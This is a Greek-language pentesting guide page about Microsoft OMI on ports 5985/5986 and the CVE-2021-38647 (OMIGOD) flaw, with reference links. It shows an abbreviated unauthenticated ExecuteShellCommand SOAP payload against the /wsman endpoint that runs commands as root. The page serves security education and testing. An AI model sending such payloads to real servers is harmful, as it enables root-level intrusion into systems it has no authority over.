# 5985,5986 - Pentesting OMI

{{#include ../banners/hacktricks-training.md}}

### **Βασικές Πληροφορίες**

**OMI** παρουσιάζεται ως ένα **[open-source](https://github.com/microsoft/omi)** εργαλείο από τη Microsoft, σχεδιασμένο για απομακρυσμένη διαχείριση ρυθμίσεων. Είναι ιδιαίτερα σχετικό για διακομιστές Linux στο Azure που χρησιμοποιούν υπηρεσίες όπως:

- **Azure Automation**
- **Azure Automatic Update**
- **Azure Operations Management Suite**
- **Azure Log Analytics**
- **Azure Configuration Management**
- **Azure Diagnostics**

Η διαδικασία `omiengine` ξεκινά και ακούει σε όλα τα interfaces ως root όταν αυτές οι υπηρεσίες ενεργοποιούνται.

**Προεπιλεγμένες θύρες** που χρησιμοποιούνται είναι **5985** (http) και **5986** (https).

### **[CVE-2021-38647 Ευπάθεια](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

Όπως παρατηρήθηκε στις 16 Σεπτεμβρίου, οι διακομιστές Linux που αναπτύχθηκαν στο Azure με τις προαναφερθείσες υπηρεσίες είναι ευάλωτοι λόγω μιας ευάλωτης έκδοσης του OMI. Αυτή η ευπάθεια έγκειται στη διαχείριση μηνυμάτων του διακομιστή OMI μέσω του endpoint `/wsman` χωρίς να απαιτείται ένα Authentication header, εξουσιοδοτώντας λανθασμένα τον πελάτη.

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό στέλνοντας ένα SOAP payload "ExecuteShellCommand" χωρίς ένα Authentication header, αναγκάζοντας τον διακομιστή να εκτελέσει εντολές με δικαιώματα root.
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
Για περισσότερες πληροφορίες σχετικά με αυτό το CVE **[ελέγξτε αυτό](https://github.com/horizon3ai/CVE-2021-38647)**.

## Αναφορές

- [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
- [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

{{#include ../banners/hacktricks-training.md}}
